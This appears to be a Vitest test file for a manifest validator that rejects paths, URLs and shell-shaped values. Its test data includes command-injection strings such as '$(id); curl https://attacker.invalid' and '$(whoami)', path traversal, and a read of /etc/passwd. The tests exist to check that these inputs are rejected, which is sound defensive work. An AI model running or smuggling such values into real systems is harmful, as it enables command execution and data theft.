import { describe, expect, it } from "vitest";

import { assertPathFreeAdapterManifest } from "./reference-boundary.js";

const safeManifest = Object.freeze({
  attempt: 1,
  geometryManifestSha256: "a".repeat(64),
  jobId: "22222222-2222-4222-8222-222222222222",
  method: "gsplat",
  preparedManifestSha256: "b".repeat(64),
  projectId: "11111111-1111-4111-8111-111111111111",
});

describe("C8 hostile adapter manifest boundary", () => {
  it("accepts only stable identities, hashes and enums", () => {
    expect(() => assertPathFreeAdapterManifest(safeManifest)).not.toThrow();
  });

  it.each([
    ["flags", ["--output", "../../escape"]],
    ["executablePath", "C:\\host\\attacker.exe"],
    ["objectKey", "tenant/private/customer.mov"],
    ["signedUrl", "https://storage.invalid/source?X-Amz-Signature=secret"],
    ["shellCommand", "$(id); curl https://attacker.invalid"],
    ["sourcePath", "/etc/passwd"],
    ["accessToken", "secret"],
  ])("rejects hostile field %s", (field, value) => {
    expect(() => assertPathFreeAdapterManifest({ ...safeManifest, [field]: value })).toThrow();
  });

  it.each([
    "../escape",
    "C:\\Windows\\System32",
    "/private/customer.mov",
    "file:///private/customer.mov",
    "https://attacker.invalid/input",
    "$(whoami)",
    "safe; unsafe",
    "safe && unsafe",
  ])("rejects location or shell-shaped nested string %s", (value) => {
    expect(() => assertPathFreeAdapterManifest({ ...safeManifest, nested: { value } })).toThrow(
      "RECONSTRUCTION_MANIFEST_LOCATION_OR_SHELL",
    );
  });

  it("bounds recursive and array input", () => {
    let value: unknown = "leaf";
    for (let index = 0; index < 22; index += 1) value = { nested: value };
    expect(() => assertPathFreeAdapterManifest(value)).toThrow(
      "RECONSTRUCTION_MANIFEST_DEPTH_EXCEEDED",
    );
    expect(() => assertPathFreeAdapterManifest(new Array(10_001).fill(0))).toThrow(
      "RECONSTRUCTION_MANIFEST_ARRAY_LIMIT",
    );
  });
});
